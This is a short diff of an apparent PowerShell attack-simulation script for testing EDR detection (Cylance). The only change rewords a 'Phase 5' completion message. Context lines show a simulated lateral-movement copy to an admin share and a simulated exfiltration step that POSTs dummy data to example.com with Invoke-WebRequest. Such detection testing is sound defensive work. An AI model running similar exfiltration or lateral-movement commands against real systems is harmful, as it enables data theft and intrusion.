@@ -71,4 +71,4 @@ RedSim "Simulated Lateral Movement" 'Copy-Item "$env:WINDIR\notepad.exe" "\\127.
 # Simulated Exfiltration
 RedSim "Simulated Data Exfil" 'Invoke-WebRequest -Uri "http://example.com/upload" -Method POST -Body "dummy_data=1234"'
 
-Write-Host "`n Phase 5 Completed. Review all Cylance logs, memory events, EDR process trees." -ForegroundColor Green
+Write-Host "`n Phase 5 complete. Review all Cylance logs, memory events, EDR process trees." -ForegroundColor Green
